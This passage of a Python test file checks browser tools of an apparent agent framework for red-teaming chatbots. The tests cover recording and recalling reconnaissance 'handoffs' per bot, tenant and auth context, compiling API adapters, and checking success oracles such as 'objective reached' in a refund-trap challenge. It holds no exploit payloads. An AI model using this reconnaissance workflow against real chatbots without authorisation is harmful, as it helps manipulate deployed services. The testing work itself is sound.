            result = await next(
                tool
                for tool in _production_browser_tools(lambda _: session, recorder)
                if tool.describe().name == "browser_compile_api_handoff"
            ).invoke(
                context,
                {
                    "method": "POST",
                    "url": f"{origin}/api/start",
                    "input_pointer": "/levelId",
                    "response_selector": "/reply",
                    "authentication": "reviewed browser session",
                    "session_constraint": "one active session identifier",
                },
            )

    assert "input_action_refs" not in event
    assert result.is_error is True
    assert "latest successful browser fill" in result.content


@pytest.mark.asyncio
async def test_api_handoff_rejects_setup_endpoint_misclassified_as_cleanup() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/start",
                    "status": 200,
                    "request_json": {"scenario": "refund"},
                    "response_json": {"sessionId": "s-1"},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"sessionId": "s-1", "message": "harmless probe"},
                    "response_json": {"reply": "observed response"},
                },
            )

    class Recorder:
        async def record_handoff(self, value):
            self.handoff = value

    async def allow(*_):
        return True

    broker = ToolBroker(browser_tools(lambda _: Session(), Recorder()), confirmer=allow)
    result = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "input_pointer": "/message",
            "response_selector": "/reply",
            "success_witness": "reply is returned",
            "oracle_predicate": {
                "oracle_id": "oracle/target-process-internal",
                "pointer": "/reply",
                "match_values": ["objective reached"],
                "modality": "text",
                "turn": "single",
                "language": "und",
            },
            "authentication": "reviewed browser session",
            "session_constraint": "one active session identifier",
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/start",
        },
    )

    assert result.is_error is True
    assert "post-interaction cleanup" in result.content


@pytest.mark.asyncio
async def test_compiled_api_handoff_seals_browser_context_transport() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"message": "probe"},
                    "response_json": {"reply": "response"},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/cleanup",
                    "status": 200,
                    "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
                    "trigger_action_ref": _cleanup_action_records()[2],
                    "request_json": {},
                    "response_json": {"closed": True},
                },
            )

    class Recorder(_CleanupActionRecorder):
        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()

    async def allow(*_):
        return True

    result = await ToolBroker(browser_tools(lambda _: Session(), recorder), confirmer=allow).invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "input_pointer": "/message",
            "response_selector": "/reply",
            "success_witness": "reply",
            "oracle_predicate": {
                "oracle_id": "oracle/target-process-internal",
                "pointer": "/reply",
                "match_values": ["objective reached"],
                "modality": "text",
                "turn": "single",
                "language": "und",
            },
            "authentication": "authenticated browser session",
            "session_constraint": "one session",
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/cleanup",
            "cleanup_acknowledgement": {
                "pointer": "/closed",
                "match_values": [True],
                "status_codes": [200],
            },
        },
    )

    assert result.is_error is False
    assert json.loads(recorder.handoff.adapter)["api_transport"] == "browser_context"
    assert recorder.handoff.recon_scope["surface"] == "https://target.test/api/message"
    assert recorder.handoff.recon_scope["agent_or_bot"] == "target.test"
    assert "origin" in recorder.handoff.reusable_site_facts


@pytest.mark.asyncio
async def test_recon_recall_separates_exact_reuse_from_different_bot_recon() -> None:
    class Recorder:
        def __init__(self, handoffs):
            self.handoffs = tuple(handoffs)

        async def list_handoffs(self, target_id, limit=20):
            return tuple(item for item in self.handoffs if item.target_id == target_id)[:limit]

    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            common = {
                "context_id": session.context_id,
                "target_id": "target",
                "owner": owner(),
                "method": "POST",
                "url": f"{origin}/api/message",
                "request_evidence_ref": "evidence:req",
                "response_evidence_ref": "evidence:res",
                "adapter": '{"interface":"http_api"}',
                "reusable_adapter": '{"interface":"http_api"}',
                "reusable_site_facts": (
                    '{"authentication_flow":"signed-in cookie",'
                    '"entry_url":"https://site.test/chat"}'
                ),
            }
            bot_a = ApiReconHandoff(
                id="handoff:bot-a",
                **common,
                recon_scope={
                    "surface": "customer-support-chat",
                    "authentication_context": "signed-in-user",
                    "tenant": "tenant-a",
                    "agent_or_bot": "refund-bot",
                    "scenario": "refund-policy",
                    "session_constraint": "one conversation",
                    "oracle_contract": "refund answer rendered",
                },
            )
            legacy = ApiReconHandoff(id="handoff:legacy", **common)
            recall = next(
                item
                for item in browser_tools(lambda _: session, Recorder((bot_a, legacy)))
                if item.describe().name == "browser_recall_reconnaissance"
            )
            exact = await recall.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                dict(bot_a.recon_scope),
            )
            assert exact.metadata["default_action"] == "lightweight_validation"
            assert [item["handoff_id"] for item in exact.metadata["exact_matches"]] == [
                "handoff:bot-a"
            ]
            assert exact.metadata["partial_matches"] == []

            different_bot = await recall.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    **dict(bot_a.recon_scope),
                    "surface": "sales-chat",
                    "agent_or_bot": "sales-bot",
                },
            )
            assert different_bot.metadata["default_action"] == "bot_specific_reconnaissance"
            assert different_bot.metadata["exact_matches"] == []
            assert different_bot.metadata["partial_matches"][0]["different_dimensions"] == [
                "agent_or_bot",
                "surface",
            ]
            assert (
                "signed-in cookie"
                in different_bot.metadata["partial_matches"][0]["shared_site_facts"]
            )

            guessed_public_auth = await recall.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "surface": "sales-chat",
                    "authentication_context": "public",
                    "tenant": "tenant-a",
                    "agent_or_bot": "sales-bot",
                },
            )
            assert guessed_public_auth.metadata["exact_matches"] == []
            shared = guessed_public_auth.metadata["partial_matches"][0]
            assert shared["authentication_reusable"] is False
            assert json.loads(shared["shared_site_facts"]) == {
                "entry_url": "https://site.test/chat"
            }
            assert "authentication_context" in shared["different_dimensions"]

            unknown_auth = await recall.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "surface": "sales-chat",
                    "tenant": "tenant-a",
                    "agent_or_bot": "sales-bot",
                },
            )
            assert unknown_auth.metadata["default_action"] == "bot_specific_reconnaissance"
            assert unknown_auth.metadata["partial_matches"][0]["authentication_reusable"] is False


@pytest.mark.asyncio
async def test_recon_recall_does_not_reuse_legacy_passive_session_adapter() -> None:
    class Recorder:
        def __init__(self, handoff):
            self.handoff = handoff

        async def list_handoffs(self, target_id, limit=20):
            return (self.handoff,) if self.handoff.target_id == target_id else ()

    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            scope = {
                "surface": "bank-chat",
                "authentication_context": "signed-in-user",
                "tenant": "tenant-a",
                "agent_or_bot": "bank-coach",
                "scenario": "bank-level-1",
                "session_constraint": "one active session",
                "oracle_contract": "validator judgment",
            }
            passive_adapter = json.dumps(
                {
                    "interface": "http_api",
                    "endpoint": f"{origin}/api/message",
                    "api_steps": [
                        {
                            "method": "GET",
                            "interaction": False,
                            "cleanup": False,
                            "captures": {"session_id": "/sessionId"},
                        },
                        {
                            "method": "POST",
                            "interaction": True,
                            "cleanup": False,
                            "captures": {},
                        },
                    ],
                },
                sort_keys=True,
                separators=(",", ":"),
            )
            handoff = ApiReconHandoff(
                id="handoff:passive-session",
                context_id=session.context_id,
                target_id="target",
                owner=owner(),
                method="POST",
                url=f"{origin}/api/message",
                request_evidence_ref="evidence:req",
                response_evidence_ref="evidence:res",
                adapter=passive_adapter,
                reusable_adapter=passive_adapter,
                reusable_site_facts=json.dumps(
                    {"origin": origin}, sort_keys=True, separators=(",", ":")
                ),
                recon_scope=scope,
            )
            recall = next(
                item
                for item in browser_tools(lambda _: session, Recorder(handoff))
                if item.describe().name == "browser_recall_reconnaissance"
            )

            result = await recall.invoke(ToolContext(session_id="s1", workspace_root="/tmp"), scope)

            assert result.metadata["exact_matches"] == []
            assert result.metadata["default_action"] == "bot_specific_reconnaissance"
            assert [item["handoff_id"] for item in result.metadata["partial_matches"]] == [
                "handoff:passive-session"
            ]
            assert "reusable_adapter" not in result.metadata["partial_matches"][0]


@pytest.mark.asyncio
@pytest.mark.parametrize("setup_kind", ("csrf_bootstrap", "proven_get_session_creator"))
async def test_recon_recall_preserves_reusable_get_setup_when_not_passive_session_read(
    setup_kind: str,
) -> None:
    class Recorder:
        def __init__(self, handoff):
            self.handoff = handoff

        async def list_handoffs(self, target_id, limit=20):
            return (self.handoff,) if self.handoff.target_id == target_id else ()

    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            scope = {
                "surface": "support-chat",
                "authentication_context": "signed-in-user",
                "tenant": "tenant-a",
                "agent_or_bot": "support-bot",
                "scenario": "support-level-1",
                "session_constraint": "one session",
                "oracle_contract": "validator judgment",
            }
            capture_name = "csrf_token" if setup_kind == "csrf_bootstrap" else "session_id"
            adapter: dict[str, object] = {
                "interface": "http_api",
                "endpoint": f"{origin}/api/message",
                "api_steps": [
                    {
                        "method": "GET",
                        "interaction": False,
                        "cleanup": False,
                        "captures": {capture_name: f"/{capture_name}"},
                    },
                    {
                        "method": "POST",
                        "interaction": True,
                        "cleanup": False,
                        "captures": {},
                    },
                ],
            }
            if setup_kind == "proven_get_session_creator":
                adapter.update(
                    {
                        "cleanup_discovery": {"session_ownership": "owned"},
                        "session_creation_transition": {
                            "precondition": {"pointer": "/state", "match_values": ["absent"]},
                            "postcondition": {
                                "pointer": "/sessionId",
                                "match_values": ["created-session"],
                            },
                            "remote_session_id": "created-session",
                            "evidence_refs": ["browser-action:sha256:" + "a" * 64],
                        },
                    }
                )
            adapter_json = json.dumps(adapter, sort_keys=True, separators=(",", ":"))
            handoff = ApiReconHandoff(
                id=f"handoff:{setup_kind}",
                context_id=session.context_id,
                target_id="target",
                owner=owner(),
                method="POST",
                url=f"{origin}/api/message",
                request_evidence_ref="evidence:req",
                response_evidence_ref="evidence:res",
                adapter=adapter_json,
                reusable_adapter=adapter_json,
                reusable_site_facts=json.dumps(
                    {"origin": origin}, sort_keys=True, separators=(",", ":")
                ),
                recon_scope=scope,
            )
            recall = next(
                item
                for item in browser_tools(lambda _: session, Recorder(handoff))
                if item.describe().name == "browser_recall_reconnaissance"
            )

            result = await recall.invoke(ToolContext(session_id="s1", workspace_root="/tmp"), scope)

            assert result.metadata["default_action"] == "lightweight_validation"
            assert [item["handoff_id"] for item in result.metadata["exact_matches"]] == [
                f"handoff:{setup_kind}"
            ]
            assert result.metadata["exact_matches"][0]["reusable_adapter"] == adapter_json


@pytest.mark.asyncio
async def test_recon_recall_tolerates_scope_drift_and_reuses_exact_adapter() -> None:
    class Recorder:
        def __init__(self, handoffs):
            self.handoffs = tuple(handoffs)

        async def list_handoffs(self, target_id, limit=20):
            return tuple(item for item in self.handoffs if item.target_id == target_id)[:limit]

    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            recorded = ApiReconHandoff(
                id="handoff:recorded",
                context_id=session.context_id,
                target_id="target",
                owner=owner(),
                method="POST",
                url=f"{origin}/api/message",
                request_evidence_ref="evidence:req",
                response_evidence_ref="evidence:res",
                adapter='{"interface":"http_api"}',
                reusable_adapter='{"interface":"http_api"}',
                reusable_site_facts='{"origin":"https://plunder.me"}',
                recon_scope={
                    "surface": "https://plunder.me",
                    "authentication_context": "authenticated-cookie-session",
                    "tenant": "Breakroom",
                    "agent_or_bot": "FareCare",
                    "scenario": (
                        "policy-refund-trap-L1-completed-travel-retroactive-bereavement-refund"
                    ),
                    "session_constraint": "single-session-per-levelId",
                    "oracle_contract": "gameStatus won",
                },
            )
            recall = next(
                item
                for item in browser_tools(lambda _: session, Recorder((recorded,)))
                if item.describe().name == "browser_recall_reconnaissance"
            )
            drifted = await recall.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "surface": "https://plunder.me/policy-refund-trap (chat UI)",
                    "authentication_context": (
                        "authenticated cookie session (Breakroom account lucas@tvl-labs.io)"
                    ),
                    "tenant": "breakroom",
                    "agent_or_bot": "Breakroom Policy Refund Trap (FareCare)",
                    "scenario": "refund trap L1",
                    "session_constraint": "single session per levelId",
                    "oracle_contract": "gameStatus won",
                },
            )
            assert drifted.metadata["default_action"] == "lightweight_validation"
            assert [item["handoff_id"] for item in drifted.metadata["exact_matches"]] == [
                "handoff:recorded"
            ]
            assert drifted.metadata["partial_matches"] == []

            omitted_tenant = await recall.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "surface": "https://plunder.me/policy-refund-trap (chat UI)",
                    "authentication_context": "authenticated cookie session",
                    "agent_or_bot": "Breakroom Policy Refund Trap (FareCare)",
                    "scenario": "refund trap L1",
                    "session_constraint": "single session per levelId",
                    "oracle_contract": "gameStatus won",
                },
            )
            assert omitted_tenant.metadata["default_action"] == "lightweight_validation"
            assert [item["handoff_id"] for item in omitted_tenant.metadata["exact_matches"]] == [
                "handoff:recorded"
            ]

            other_tenant = recorded.model_copy(
                update={
                    "id": "handoff:other-tenant",
                    "recon_scope": {**recorded.recon_scope, "tenant": "Another tenant"},
                }
            )
            ambiguous = next(
                item
                for item in browser_tools(lambda _: session, Recorder((recorded, other_tenant)))
                if item.describe().name == "browser_recall_reconnaissance"
            )
            ambiguous_result = await ambiguous.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "surface": "https://plunder.me/policy-refund-trap (chat UI)",
                    "authentication_context": "authenticated cookie session",
                    "agent_or_bot": "Breakroom Policy Refund Trap (FareCare)",
                    "scenario": "refund trap L1",
                    "session_constraint": "single session per levelId",
                    "oracle_contract": "gameStatus won",
                },
            )
            assert ambiguous_result.metadata["exact_matches"] == []
            assert ambiguous_result.metadata["partial_matches"] == []


@pytest.mark.asyncio
async def test_recon_recall_projects_best_reusable_matches_with_omission_receipts() -> None:
    class Recorder:
        def __init__(self, handoffs):
            self.handoffs = tuple(handoffs)

        async def list_handoffs(self, target_id, limit=20):
            return tuple(item for item in self.handoffs if item.target_id == target_id)[:limit]

    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            scope = {
                "surface": "support-chat",
                "authentication_context": "signed-in-user",
                "tenant": "tenant-a",
                "agent_or_bot": "refund-bot",
                "scenario": "refund-policy",
                "session_constraint": "one conversation",
                "oracle_contract": "refund answer rendered",
            }
            common = {
                "context_id": session.context_id,
                "target_id": "target",
                "owner": owner(),
                "method": "POST",
                "url": f"{origin}/api/message",
                "request_evidence_ref": "evidence:req",
                "response_evidence_ref": "evidence:res",
                "adapter": '{"interface":"http_api"}',
                "reusable_site_facts": '{"origin":"https://site.test"}',
            }
            older_exact = ApiReconHandoff(
                id="handoff:exact-older",
                reusable_adapter='{"interface":"http_api","version":"older"}',
                recon_scope=scope,
                **common,
            )
            newer_exact = ApiReconHandoff(
                id="handoff:exact-newer",
                reusable_adapter='{"interface":"http_api","version":"newer"}',
                recon_scope=scope,
                created_at=older_exact.created_at + timedelta(microseconds=1),
                **common,
            )
            weaker_partial = ApiReconHandoff(
                id="handoff:partial-weaker",
                reusable_adapter='{"interface":"http_api"}',
                recon_scope={
                    **scope,
                    "authentication_context": "anonymous",
                    "scenario": "sales-policy",
                },
                **common,
            )
            stronger_partial = ApiReconHandoff(
                id="handoff:partial-stronger",
                reusable_adapter='{"interface":"http_api"}',
                recon_scope={**scope, "scenario": "sales-policy"},
                **common,
            )
            recall = next(
                item
                for item in browser_tools(
                    lambda _: session,
                    Recorder((older_exact, weaker_partial, newer_exact, stronger_partial)),
                )
                if item.describe().name == "browser_recall_reconnaissance"
            )

            result = await recall.invoke(ToolContext(session_id="s1", workspace_root="/tmp"), scope)

            assert [item["handoff_id"] for item in result.metadata["exact_matches"]] == [
                "handoff:exact-newer"
            ]
            assert result.metadata["exact_matches"][0]["reusable_adapter"] == (
                '{"interface":"http_api","version":"newer"}'
            )
            assert [item["handoff_id"] for item in result.metadata["partial_matches"]] == [
                "handoff:partial-stronger"
            ]
            assert result.metadata["match_projection"]["exact"] == {
                "eligible_count": 2,
                "returned_count": 1,
                "omitted_count": 1,
                "omitted_digest": result.metadata["match_projection"]["exact"]["omitted_digest"],
            }
            assert result.metadata["match_projection"]["partial"]["eligible_count"] == 2
            assert result.metadata["match_projection"]["partial"]["omitted_count"] == 1
            assert result.metadata["match_projection"]["exact"]["omitted_digest"].startswith(
                "sha256:"
            )
            assert result.metadata["match_projection"]["partial"]["omitted_digest"].startswith(
                "sha256:"
            )
            assert "handoff:exact-older" not in result.content
            assert "handoff:partial-weaker" not in result.content


@pytest.mark.asyncio
async def test_recon_recall_excludes_auth_or_tenant_mismatch_and_handles_cold_start() -> None:
    class Recorder:
        def __init__(self, handoffs=()):
            self.handoffs = tuple(handoffs)

        async def list_handoffs(self, _target_id, limit=20):
            return self.handoffs[:limit]

    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            handoff = ApiReconHandoff(
                id="handoff:private",
                context_id=session.context_id,
                target_id="target",
                owner=owner(),
                method="POST",
                url=f"{origin}/api/message",
                request_evidence_ref="evidence:req",
                response_evidence_ref="evidence:res",
                adapter='{"interface":"http_api"}',
                reusable_adapter='{"interface":"http_api"}',
                recon_scope={
                    "surface": "support-chat",
                    "authentication_context": "signed-in-user",
                    "tenant": "tenant-a",
                    "agent_or_bot": "support-bot",
                },
            )
            context = ToolContext(session_id="s1", workspace_root="/tmp")
            mismatched = next(
                item
                for item in browser_tools(lambda _: session, Recorder((handoff,)))
                if item.describe().name == "browser_recall_reconnaissance"
            )
            result = await mismatched.invoke(
                context,
                {
                    "surface": "support-chat",
                    "authentication_context": "anonymous",
                    "tenant": "tenant-b",
                    "agent_or_bot": "support-bot",
                },
            )
            assert result.metadata["default_action"] == "full_reconnaissance"
            assert result.metadata["exact_matches"] == []
            assert result.metadata["partial_matches"] == []
            assert result.metadata["recall_status"] == "complete"
            assert result.metadata["callback_pending"] is False
            assert result.metadata["next_action"] == (
                "Call browser_open_tab now and begin full reconnaissance."
            )
            assert "no callback will arrive" in result.metadata["instruction"]

            cold = next(
                item
                for item in browser_tools(lambda _: session, Recorder())
                if item.describe().name == "browser_recall_reconnaissance"
            )
            result = await cold.invoke(
                context,
                {
                    "surface": "support-chat",
                    "authentication_context": "anonymous",
                    "agent_or_bot": "support-bot",
                },
            )
            assert result.metadata["default_action"] == "full_reconnaissance"
            assert result.metadata["recall_status"] == "complete"
            assert result.metadata["callback_pending"] is False


@pytest.mark.asyncio
async def test_browser_open_tab_requires_recall_when_durable_recon_exists() -> None:
    class Recorder:
        def __init__(self, handoff):
            self.handoff = handoff

        async def list_handoffs(self, target_id, limit=20):
            return (self.handoff,) if self.handoff.target_id == target_id else ()

        async def append_action(self, _value):
            return None

        async def append_observation(self, _value):
            return None

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            handoff = ApiReconHandoff(
                id="handoff:existing",
                context_id=session.context_id,
                target_id="target",
                owner=owner(),
                method="POST",
                url=f"{origin}/api/message",
                request_evidence_ref="evidence:req",
                response_evidence_ref="evidence:res",
                adapter='{"interface":"http_api"}',
                reusable_adapter='{"interface":"http_api"}',
                reusable_site_facts='{"origin":"target.test"}',
                recon_scope={"surface": "browser", "agent_or_bot": "support-bot"},
            )
            tools = browser_tools(lambda _: session, Recorder(handoff))
            open_tab = next(item for item in tools if item.describe().name == "browser_open_tab")
            recall = next(
                item
                for item in tools
                if item.describe().name == "browser_recall_reconnaissance"
            )
            context = ToolContext(session_id="s1", workspace_root="/tmp")

            blocked = await open_tab.invoke(context, {"url": origin})

            assert blocked.is_error is True
            assert blocked.metadata["failure_code"] == "recon_recall_required"
            assert blocked.metadata["required_tool"] == "browser_recall_reconnaissance"
            assert blocked.metadata["target_effect_attempted"] is False

            recalled = await recall.invoke(
                context,
                {"surface": "browser", "agent_or_bot": "support-bot"},
            )
            opened = await open_tab.invoke(context, {"url": origin})

            assert recalled.is_error is False
            assert opened.is_error is False


@pytest.mark.asyncio
async def test_api_handoff_tool_rejects_ambiguous_adapter_and_fallback_choice() -> None:
    class Recorder:
        async def record_handoff(self, value):
            raise AssertionError(f"invalid handoff must not persist: {value}")

    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tool = next(
                item
                for item in browser_tools(lambda _: session, Recorder())
                if item.describe().name == "browser_record_api_handoff"
            )
            result = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api",
                    "request_evidence_ref": "req",
                    "response_evidence_ref": "res",
                    "adapter": "openai-compatible",
                    "dom_fallback_reason": "also fallback",
                },
            )
            assert result.is_error
            assert "exactly one" in result.content

            missing_browser_adapter = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "browser",
                    "url": f"{origin}/chat",
                    "request_evidence_ref": "req",
                    "response_evidence_ref": "res",
                    "dom_fallback_reason": "API lifecycle was not observed",
                },
            )
            assert missing_browser_adapter.is_error
            assert "DOM fallback requires reusable_adapter" in missing_browser_adapter.content

            legacy_browser_adapter = reviewed_browser_adapter(f"{origin}/chat")
            legacy_browser_adapter["interaction_contract"]["input_limit"] = {  # type: ignore[index]
                "characters": 500,
                "evidence": "maxlength=500",
            }
            invalid_browser_contract = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "browser",
                    "url": f"{origin}/chat",
                    "request_evidence_ref": "req",
                    "response_evidence_ref": "res",
                    "dom_fallback_reason": "API lifecycle was not observed",
                    "reusable_adapter": legacy_browser_adapter,
                },
            )
            assert invalid_browser_contract.is_error
            assert "exactly one current reviewed tab" in invalid_browser_contract.content


@pytest.mark.asyncio
async def test_dom_handoff_requires_live_locators_but_treats_probe_witness_as_advisory() -> None:
    class Recorder:
        def __init__(self) -> None:
            self.handoffs = []

        async def record_handoff(self, value):
            self.handoffs.append(value)

    page = b"""
    <textarea aria-label="Message" maxlength="500"></textarea>
    <button aria-label="Send">Send</button>
    <div>harmless probe</div><div>assistant reply marker</div>
    """
    async with web_fixture(page) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            await session.new_tab(origin)
            recorder = Recorder()
            tool = ApiReconHandoffTool(lambda _: session, recorder)
            adapter = reviewed_browser_adapter(origin)
            probe = adapter["interaction_contract"]["probe"]  # type: ignore[index]
            probe["sent_message_witness"] = "harmless probe"  # type: ignore[index]
            probe["response_witness"] = "assistant reply marker"  # type: ignore[index]
            arguments = {
                "method": "browser",
                "url": origin,
                "request_evidence_ref": "req",
                "response_evidence_ref": "res",
                "dom_fallback_reason": "no equivalent API interaction was observed",
                "reusable_adapter": adapter,
            }

            accepted = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"), arguments
            )
            assert accepted.is_error is False
            assert len(recorder.handoffs) == 1
            probe["response_witness"] = "a prose description of the reply"  # type: ignore[index]
            advisory_witness = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"), arguments
            )
            assert advisory_witness.is_error is False
            assert len(recorder.handoffs) == 2

            malformed = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api",
                    "request_evidence_ref": "req",
                    "response_evidence_ref": "res",
                    "adapter": "not-json",
                },
            )
            assert malformed.is_error
            assert "canonical JSON" in malformed.content

            secret_site_facts = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api",
                    "request_evidence_ref": "req",
                    "response_evidence_ref": "res",
                    "adapter": reviewed_api_adapter_json(f"{origin}/api"),
                    "reusable_site_facts": '{"password":"must-not-persist"}',
                },
            )
            assert secret_site_facts.is_error
            assert "credential-like" in secret_site_facts.content

            live_shorthand = json.loads(reviewed_api_adapter_json(f"{origin}/api"))
            live_shorthand["api_steps"] = [
                {
                    "step": 1,
                    "action": "Send one chat message",
                    "request_evidence_ref": "req",
                    "response_evidence_ref": "res",
                }
            ]
            incomplete_steps = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api",
                    "request_evidence_ref": "req",
                    "response_evidence_ref": "res",
                    "adapter": json.dumps(live_shorthand, sort_keys=True, separators=(",", ":")),
                },
            )
            assert incomplete_steps.is_error
            assert "api_steps[0] is incomplete" in incomplete_steps.content

            wrong_types = json.loads(reviewed_api_adapter_json(f"{origin}/api"))
            wrong_types["api_steps"][0]["cleanup"] = "none observed"
            invalid_types = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api",
                    "request_evidence_ref": "req",
                    "response_evidence_ref": "res",
                    "adapter": json.dumps(wrong_types, sort_keys=True, separators=(",", ":")),
                },
            )
            assert invalid_types.is_error is False
            assert any(
                item.get("source") == "target_adapter_compiler.api_steps[0].cleanup"
                for item in invalid_types.metadata.get("evaluation_uncertainties", [])
            )


@pytest.mark.asyncio
async def test_dom_handoff_rejects_exact_captured_json_probe_exchange() -> None:
    class Recorder:
        handoff = None

        async def record_handoff(self, value):
            self.handoff = value

    page = b"""
    <textarea aria-label="Message" maxlength="500">harmless probe</textarea>
    <button aria-label="Send" onclick="fetch('/api/message', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body:JSON.stringify({message:'harmless probe'})
    }).then(r=>r.json()).then(()=>document.getElementById('reply').textContent=
      'assistant reply marker')">Send</button>
    <div>harmless probe</div><div id="reply">assistant reply marker</div>
    """
    async with web_fixture(page) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            send = next(item for item in snapshot.elements if item.name == "Send")
            await session.act(action(session, tab, "click", element_ref=send.ref))
            for _ in range(20):
                if session.api_exchange_events():
                    break
                await asyncio.sleep(0.01)
            adapter = reviewed_browser_adapter(origin)
            probe = adapter["interaction_contract"]["probe"]  # type: ignore[index]
            probe["message"] = "harmless probe"  # type: ignore[index]
            probe["sent_message_witness"] = "harmless probe"  # type: ignore[index]
            probe["response_witness"] = "assistant reply marker"  # type: ignore[index]
            recorder = Recorder()
            tool = ApiReconHandoffTool(lambda _: session, recorder)

            result = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "browser",
                    "url": origin,
                    "request_evidence_ref": "req",
                    "response_evidence_ref": "res",
                    "dom_fallback_reason": "no equivalent API interaction was observed",
                    "reusable_adapter": adapter,
                },
            )

            assert result.is_error is False
            assert recorder.handoff is not None
            assert result.metadata["api_candidate_observed"].endswith("/api/message")
            assert result.metadata["evaluation_uncertainties"]


_PROBE_MESSAGE = "Please restate the applicable refund policy."


def _dom_fallback_session(exchange: dict[str, object]) -> type:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(
            target_id="target",
            allowed_origins={"https://target.test"},
        )
        owner = owner()

        def api_exchange_events(self):
            return (dict(exchange),)

        def metadata(self):
            return SimpleNamespace(tabs=[SimpleNamespace(tab_ref="tab-1", state="open")])

        async def snapshot(self, _tab):
            return SimpleNamespace(
                elements=[
                    SimpleNamespace(
                        role="textbox", name="Message", ref="tab-1:message", frame_ref="main"
                    ),
                    SimpleNamespace(role="button", name="Send", ref="tab-1:send", frame_ref="main"),
                ]
            )

    return Session


class _NativeReceiptRecorder:
    handoff = None

    async def record_handoff(self, value):
        self.handoff = value

    def reviewed_native_input_receipt(self, context_id, _event, input_pointer):
        return {
            "context_id": context_id,
            "target_id": "target",
            "input_pointer": input_pointer,
            "evidence_ref": "native-request:sha256:" + "f" * 64,
        }


@pytest.mark.asyncio
async def test_dom_fallback_seals_compiled_api_adapter_from_probe_linked_exchange() -> None:
    exchange = {
        "method": "POST",
        "url": "https://target.test/api/bank/message",
        "status": 200,
        "request_json": {"message": _PROBE_MESSAGE},
        "response_json": {"reply": "observed response"},
        "trigger_action_ref": "browser-action:sha256:" + "d" * 64,
        "input_action_refs": {"/message": "browser-action:sha256:" + "c" * 64},
        "input_probe_refs": {"/message": "browser-input-probe:" + "e" * 32},
    }
    recorder = _NativeReceiptRecorder()
    tool = ApiReconHandoffTool(lambda _: _dom_fallback_session(exchange)(), recorder)

    result = await tool.invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "browser",
            "url": "https://target.test/chat",
            "request_evidence_ref": "req",
            "response_evidence_ref": "res",
            "dom_fallback_reason": "browser write path never settles after submit",
            "reusable_adapter": reviewed_browser_adapter("https://target.test/chat"),
        },
    )

    assert result.is_error is False
    assert result.metadata["compiled_adapter"] is True
    assert result.metadata["preferred_next_tool"] == "assessment_prepare"
    assert "api_candidate_observed" not in result.metadata
    handoff = recorder.handoff
    assert handoff is not None
    assert handoff.dom_fallback_reason == "browser write path never settles after submit"
    retained_browser = json.loads(handoff.reusable_adapter)
    assert retained_browser["interface"] == "browser"
    sealed = json.loads(handoff.adapter)
